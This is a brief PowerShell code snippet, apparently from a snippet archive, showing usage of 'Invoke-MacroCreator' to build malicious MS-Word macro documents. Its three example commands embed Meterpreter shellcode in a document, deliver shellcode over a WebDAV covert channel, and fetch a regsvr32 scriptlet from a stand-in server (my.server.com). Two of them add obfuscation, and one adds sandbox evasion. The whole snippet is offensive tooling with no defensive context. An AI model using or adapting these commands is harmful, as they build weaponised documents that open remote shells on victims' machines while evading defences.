---
id: 7deff367-6cf8-4510-ac91-0bd5bcd08b78
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:23.416290+00:00'
updated_at: '2023-04-10T20:36:48.552086+00:00'
---

# Code Snippet 7deff367

**Language**: ps1

```ps1
# Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:
C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
# Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:
C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
# Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:
C:\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
```
